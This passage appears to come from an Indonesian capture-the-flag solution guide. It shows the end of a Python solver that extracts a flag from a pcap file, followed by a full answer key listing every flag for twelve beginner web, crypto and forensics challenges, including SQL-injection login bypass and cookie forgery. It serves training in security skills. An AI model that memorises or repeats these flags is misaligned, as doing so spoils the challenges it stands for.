    with open(os.path.join(DOWNLOADS_DIR, "rekaman_jaringan.pcap"), "rb") as f:
        pcap_data = f.read()
    flag_f4 = re.search(rb'CTF\{[^}]+\}', pcap_data).group(0).decode('utf-8')
    flags["forensics-4"] = flag_f4
    print(f"[OK] Forensics 4: {flag_f4}")

    print_header("RANGKUMAN 12 FLAG LENGKAP")
    for ch_id, flg in flags.items():
        print(f"[{ch_id:<12}] -> {flg}")

if __name__ == "__main__":
    solve_all()
```

---

## 5. Ringkasan Kunci Jawaban (Master Flag List)

| No | ID Soal | Kategori | Judul Tantangan | Poin | Plaintext Flag |
| :---: | :--- | :--- | :--- | :---: | :--- |
| 1 | `web-1` | Web Exploitation | Inspeksi Header Tersembunyi | 100 | `CTF{inspeksi_header_tersembunyi}` |
| 2 | `web-2` | Web Exploitation | Jejak Robot Terlarang | 150 | `CTF{jejak_robots_txt_terbongkar}` |
| 3 | `web-3` | Web Exploitation | Pemalsuan Cookie Akses | 200 | `CTF{manipulasi_cookie_admin_sukses}` |
| 4 | `web-4` | Web Exploitation | Gerbang Login Injeksi SQL | 250 | `CTF{bypass_sqli_login_berhasil}` |
| 5 | `crypto-1` | Cryptography | Sandi Pergeseran Romawi | 100 | `CTF{sandi_caesar_rot13_dasar}` |
| 6 | `crypto-2` | Cryptography | Enkripsi Tiga Lapis | 150 | `CTF{tiga_lapis_encoding_biner_hex_base64}` |
| 7 | `crypto-3` | Cryptography | Teka-Teki Kunci Tunggal XOR | 200 | `CTF{single_byte_xor_kunci_terbongkar}` |
| 8 | `crypto-4` | Cryptography | Misteri Sandi Polialfabetik | 250 | `CTF{sandi_vigenere_kunci_rahasia}` |
| 9 | `forensics-1`| Digital Forensics | Metadata Rahasia Gambar | 100 | `CTF{metadata_exif_gambar_ditemukan}` |
| 10 | `forensics-2`| Digital Forensics | Memperbaiki Magic Header PNG | 150 | `CTF{magic_bytes_png_berhasil_diperbaiki}` |
| 11 | `forensics-3`| Digital Forensics | Arsip Tersembunyi di Balik Gambar | 200 | `CTF{arsip_zip_tersembunyi_di_gambar}` |
| 12 | `forensics-4`| Digital Forensics | Penyadapan Lalu Lintas Jaringan | 250 | `CTF{analisis_paket_jaringan_http_wireshark}` |

*Dokumen disusun resmi untuk CyberStrike CTF Arena.*
